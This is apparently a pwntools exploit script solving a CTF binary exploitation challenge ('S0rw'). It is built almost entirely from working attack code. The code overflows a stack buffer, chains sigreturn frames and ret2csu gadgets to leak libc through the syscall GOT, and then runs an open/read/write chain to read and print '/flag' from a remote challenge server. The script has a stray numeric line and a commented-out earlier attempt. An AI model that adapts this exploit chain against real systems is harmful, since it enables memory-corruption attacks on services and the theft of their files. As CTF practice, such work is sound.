from pwn import *
from LibcSearcher import *
from ae64 import AE64

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./S0rw/S0rw"
libc_addr = "./S0rw/libc.so.6"
ld_addr = "../../glibc-all-in-one/libs/2.31-0ubuntu9_i386/ld-2.31.so"

rop = ROP(binary)
elf = ELF(binary)

libc = ELF(libc_addr)
ld = ELF(ld_addr)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 21849
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
    libc_addr = "/lib/x86_64-linux-gnu/libc.so.6"
    libc = ELF(libc_addr)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)
    dbg = lambda _: None
88

ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x4007F0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    # payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rcx=0, rdx=0, rbp=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rcx = rcx
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rbp = rbp
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
vuln_addr = 0x4007A4
syscall_plt = elf.plt.syscall
syscall_got = elf.got.syscall
ret_addr = 0x000000000040056E
rdi_addr = 0x0000000000400813
bss_addr = 0x601500
bss_addr2 = 0x601300
bss_addr3 = 0x601600
pop_rbp = 0x0000000000400628


payload = b"a" * 0x18
# payload += p64(vuln_addr)
payload += p64(rdi_addr)
payload += p64(15)
payload += p64(syscall_plt)
payload += sig(
    rdi=0,
    rsi=0,
    rdx=bss_addr2,
    rcx=0x500,
    rbp=bss_addr2,
    rsp=bss_addr2,
    rip=syscall_plt,
)
p.sendlineafter(b"program!\n", payload)


sleep(1)
payload = p64(rdi_addr)
payload += p64(15)
payload += p64(syscall_plt)
payload += sig(
    rdi=1,
    rsi=2,
    rdx=syscall_got,
    rcx=0x50,
    rbp=bss_addr,
    rsp=bss_addr,
    rip=syscall_plt,
)
payload = payload.ljust(0x200, b"a")
payload += p64(rdi_addr)
payload += p64(15)
payload += p64(syscall_plt)
payload += sig(
    rdi=0,
    rsi=0,
    rdx=bss_addr3 - 0x20,
    rcx=0x500,
    rbp=bss_addr3,
    rsp=bss_addr3,
    rip=syscall_plt,
)
p.send(payload)

dbg(p)
sleep(1)
libc_offset = u64(p.recv(8)) - libc.sym.syscall
ls(libc_offset)
libc.address = libc_offset
open_addr = libc.sym.open
read_addr = libc.sym.read
write_addr = libc.sym.write

payload = b"/flag\x00\x00\x00"
payload += p64(open_addr)
payload += p64(read_addr)
payload += p64(write_addr)
payload += csu(edi=2, rsi=bss_addr3 - 0x20, rdx=0, r12=syscall_got)
payload += b"a" * 56
payload += csu(edi=3, rsi=bss_addr3 + 0x300, rdx=0x50, r12=bss_addr3 - 0x10)
payload += b"a" * 56
payload += csu(edi=2, rsi=bss_addr3 + 0x300, rdx=0x50, r12=bss_addr3 - 0x8)
payload += b"a" * 56
p.send(payload)

"""
payload = csu(edi=1, rsi=2, rdx=syscall_got, r12=syscall_got)
payload += b"a" * 56
payload += csu(edi=0, rsi=0, rdx=bss_addr - 0x20, r12=syscall_got)
payload += b"a" * 56
payload += p64(rdi_addr)
payload += p64(15)
payload += p64(syscall_plt)
# payload += csu(edi=15, rsi=0, rdx=0x0, r12=syscall_got)
payload += sig(
    rax=1,
    rdi=1,
    rsi=bss_addr,
    rdx=0x100,
    rbp=bss_addr + 0x50,
    rsp=bss_addr,
    rip=ret_addr,
)


libc.address = libc_offset

open_addr = libc.sym.open
read_addr = libc.sym.read
write_addr = libc.sym.write

payload = b"/flag\x00\x00\x00"
payload += p64(open_addr)
payload += p64(read_addr)
payload += p64(write_addr)
payload += csu(edi=2, rsi=bss_addr - 0x20, rdx=0, r12=syscall_got)
payload += b"a" * 56
payload += csu(edi=3, rsi=bss_addr + 0x300, rdx=0x20, r12=bss_addr - 0x10)
payload += b"a" * 56
payload += csu(edi=2, rsi=bss_addr + 0x300, rdx=0x20, r12=bss_addr - 0x8)
payload += b"a" * 56
p.send(payload)


payload += csu(edi=1, rsi=2, rdx=syscall_got, r12=syscall_got)
"""


p.interactive()
